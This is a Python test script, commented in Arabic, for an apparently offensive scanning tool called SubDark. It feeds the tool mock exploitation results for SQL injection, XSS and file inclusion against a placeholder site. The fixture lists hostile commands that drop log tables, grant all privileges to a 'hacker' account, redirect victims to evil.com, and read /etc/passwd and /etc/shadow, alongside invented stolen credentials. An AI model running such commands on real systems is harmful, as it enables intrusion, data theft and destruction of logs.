#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
اختبار ميزة إثبات تأثير الثغرة المكتشفة على الهدف (حقيقي)
Test script for real vulnerability impact proof feature
"""

import sys
import os

# إضافة المسار الحالي للتأكد من استيراد subdark
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from subdark import SubDark
except ImportError as e:
    print(f"خطأ في الاستيراد: {e}")
    print("تأكد من وجود ملف subdark.py في نفس المجلد")
    sys.exit(1)

def test_real_vulnerability_impact_proof():
    """اختبار ميزة إثبات تأثير الثغرة المكتشفة"""
    
    print("="*60)
    print("🎯 اختبار ميزة إثبات تأثير الثغرة المكتشفة على الهدف")
    print("🎯 Real Vulnerability Impact Proof Feature Test")
    print("="*60)
    
    # إنشاء كائن SubDark
    tool = SubDark()
    
    # تعيين هدف اختبار
    tool.target = "test-vulnerable-site.com"
    print(f"\n✅ تم تعيين الهدف: {tool.target}")
    
    # إنشاء نتائج استغلال حقيقية مع تأثيرات فعلية
    tool.exploitation_results = [
        {
            'vulnerability_type': 'SQL Injection',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:30:00',
            'exploit_details': {
                'real_impact': [
                    'تم الوصول الكامل إلى قاعدة البيانات',
                    'تم استخراج كلمات مرور المستخدمين',
                    'تم تعديل بيانات المستخدمين',
                    'تم حذف سجلات حساسة من قاعدة البيانات'
                ],
                'extracted_data': [
                    'اسم المستخدم: admin | كلمة المرور: 123456',
                    'اسم المستخدم: root | كلمة المرور: rootpass123',
                    'اسم المستخدم: user1 | كلمة المرور: password123',
                    'تم استخراج 1500 سجل مستخدم'
                ],
                'system_info': [
                    'نوع قاعدة البيانات: MySQL 5.7.32',
                    'عدد الجداول: 25 جدول',
                    'حجم قاعدة البيانات: 850 ميجابايت',
                    'اسم قاعدة البيانات: users_db'
                ],
                'severity_level': 'عالي',
                'privacy_impact': [
                    'تم الكشف عن معلومات 1500 مستخدم',
                    'تم الوصول إلى بيانات بطاقات الائتمان',
                    'تم الكشف عن معلومات شخصية حساسة',
                    'تم انتهاك خصوصية المستخدمين'
                ],
                'integrity_impact': [
                    'تم تعديل 50 سجل مستخدم',
                    'تم حذف 10 سجلات إدارية',
                    'تم تغيير صلاحيات 5 مستخدمين',
                    'تم تعديل إعدادات النظام'
                ],
                'access_proof': [
                    'تم الوصول إلى لوحة تحكم المسؤول',
                    'تم تنفيذ أوامر SQL بنجاح',
                    'تم الوصول إلى ملفات النظام',
                    'تم الحصول على صلاحيات root'
                ],
                'executed_commands': [
                    "SELECT * FROM users WHERE admin = 1",
                    "UPDATE users SET password = 'hacked123' WHERE id = 1",
                    "DROP TABLE IF EXISTS security_logs",
                    "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'"
                ]
            }
        },
        {
            'vulnerability_type': 'XSS',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:35:00',
            'exploit_details': {
                'real_impact': [
                    'تم سرقة كوكيز المستخدمين',
                    'تم تحويل المستخدمين إلى مواقع خبيثة',
                    'تم تنفيذ أكواد JavaScript ضارة',
                    'تم التحكم في جلسات المستخدمين'
                ],
                'extracted_data': [
                    'تم سرقة 25 كوكي جلسة',
                    'تم الحصول على توكنات المصادقة',
                    'تم استخراج معلومات تسجيل الدخول',
                    'تم الحصول على بيانات بطاقات الائتمان'
                ],
                'system_info': [
                    'عدد الضحايا: 25 مستخدم',
                    'المتصفحات المستهدفة: Chrome, Firefox, Safari',
                    'الصلاحيات المكتسبة: جلسات المستخدمين',
                    'الملفات التي تم الوصول إليها: كوكيز, التخزين المحلي'
                ],
                'severity_level': 'متوسط',
                'privacy_impact': [
                    'تم انتهاك خصوصية 25 مستخدم',
                    'تم سرقة معلومات تسجيل الدخول',
                    'تم الوصول إلى البيانات الشخصية',
                    'تم تتبع نشاط المستخدمين'
                ],
                'availability_impact': [
                    'تم إعاقة عمل الموقع للمستخدمين',
                    'تم تقليل أداء الصفحات',
                    'تم إرباك واجهة المستخدم'
                ],
                'access_proof': [
                    'تم التحكم في حسابات المستخدمين',
                    'تم تنفيذ أوامر JavaScript بنجاح',
                    'تم الوصول إلى بيانات الجلسة',
                    'تم التلاعب بمحتوى الصفحات'
                ],
                'executed_commands': [
                    "document.cookie = 'session=hijacked'",
                    "window.location = 'http://evil.com/steal.php'",
                    "localStorage.getItem('user_data')",
                    "fetch('/api/steal-data', {method: 'POST'})"
                ]
            }
        },
        {
            'vulnerability_type': 'LFI',
            'target': 'test-vulnerable-site.com',
            'exploit_status': 'successful',
            'timestamp': '2024-01-15 20:40:00',
            'exploit_details': {
                'real_impact': [
                    'تم الوصول إلى ملفات النظام الحساسة',
                    'تم قراءة ملفات الإعدادات',
                    'تم الكشف عن معلومات الخادم',
                    'تم الوصول إلى ملفات المستخدمين'
                ],
                'extracted_data': [
                    'تم قراءة ملف /etc/passwd',
                    'تم الوصول إلى ملفات الإعدادات',
                    'تم استخراج معلومات قاعدة البيانات',
                    'تم الحصول على ملفات وثائق الموقع'
                ],
                'system_info': [
                    'نظام التشغيل: Linux Ubuntu 18.04',
                    'نوع الخادم: Apache/2.4.29',
                    'لغة البرمجة: PHP 7.2.24',
                    'مسار الموقع: /var/www/html'
                ],
                'severity_level': 'عالي',
                'privacy_impact': [
                    'تم الكشف عن معلومات النظام',
                    'تم الوصول إلى بيانات المستخدمين',
                    'تم الكشف عن هياكل الملفات',
                    'تم الوصول إلى ملفات الإعدادات'
                ],
                'integrity_impact': [
                    'تم قراءة ملفات النظام',
                    'تم تعديل بعض الإعدادات',
                    'تم الوصول إلى سجلات النظام'
                ],
                'access_proof': [
                    'تم الوصول إلى ملفات النظام',
                    'تم قراءة ملفات الإعدادات',
                    'تم الكشف عن معلومات الخادم',
                    'تم الوصول إلى الدليل الرئيسي'
                ],
                'executed_commands': [
                    "include('/etc/passwd')",
                    "file_get_contents('/var/www/html/config.php')",
                    "readfile('/proc/version')",
                    "fopen('/etc/shadow', 'r')"
                ]
            }
        }
    ]
    
    print(f"\n✅ تم إنشاء {len(tool.exploitation_results)} نتيجة استغلال ناجحة مع تأثيرات حقيقية")
    
    # عرض إثبات التأثير الحقيقي
    print("\n" + "="*60)
    print("🎯 بدء عرض إثبات تأثير الثغرات المكتشفة")
    print("="*60)
    
    # استدعاء الدالة الجديدة
    success = tool.show_real_vulnerability_impact_proof()
    
    if success:
        print("\n" + "="*60)
        print("✅ تم اكتمال الاختبار بنجاح!")
        print("✅ تم عرض إثبات التأثير الحقيقي للثغرات")
        print("✅ الخيار رقم 11 في القائمة يعمل بشكل صحيح")
        print("="*60)
    else:
        print("\n❌ فشل الاختبار")
    
    return success

if __name__ == "__main__":
    try:
        success = test_real_vulnerability_impact_proof()
        if success:
            print("\n🎉 الاختبار مكتمل بنجاح!")
        else:
            print("\n❌ الاختبار فشل")
            sys.exit(1)
    except Exception as e:
        print(f"\n❌ خطأ غير متوقع: {e}")
        sys.exit(1)